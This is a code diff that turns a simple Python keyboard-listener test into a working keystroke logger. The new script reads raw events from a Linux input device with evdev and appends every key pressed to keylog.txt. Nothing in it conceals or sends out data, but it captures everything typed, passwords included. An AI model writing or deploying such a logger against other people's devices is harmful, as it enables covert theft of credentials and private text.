@@ -1,13 +1,23 @@
-import pynput
+import evdev
 
-from pynput import keyboard
+from evdev import InputDevice
 
-print("script doing its thing")
+device=InputDevice('/dev/input/event3')
 
-def on_press(key):
-    print(f"Raw: {key}")
-    print(f"Type: {type(key)}")
-    print("---")
+print(device.name)
+log_file = open('keylog.txt','a')
+for event in device.read_loop():
 
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+
+    if event.type == 1 and event.value == 1:
+
+        key = evdev.ecodes.KEY[event.code]
+        new_key = key.replace('KEY_',"")
+
+        if new_key == "SPACE":
+            log_file.write(" \n") 
+        elif new_key == "BACKSPACE":
+            log_file.write("[BACKSPACE]\n")
+        elif new_key == "CAPSLOCK":
+            log_file.write("[CAPS]\n")
+        else : log_file.write(new_key + "\n")
